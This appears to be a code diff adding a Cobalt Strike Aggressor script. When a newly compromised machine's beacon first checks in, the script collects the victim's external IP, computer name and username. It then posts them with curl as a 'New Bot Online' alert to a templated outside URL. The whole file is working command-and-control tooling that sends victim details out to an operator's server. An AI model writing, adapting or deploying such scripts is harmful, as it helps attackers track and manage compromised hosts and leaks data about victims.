@@ -1,0 +1,13 @@
+on beacon_initial {
+    local('$externalIP $computerName $userName');
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+
+    $message = 'New Bot Online: \n\n Computer name：'.$computerName.'\n\nUsername:'.$userName.'\n\nexternalIP:'.$externalIP;
+
+	$url = '{{STORE}}?action=store';
+
+    @curl_command = @('curl', '-X', 'POST', '--data-binary', '{"msgtype": "text", "text": {"content": "'. $message .'"}}',$url);
+	exec(@curl_command);
+}
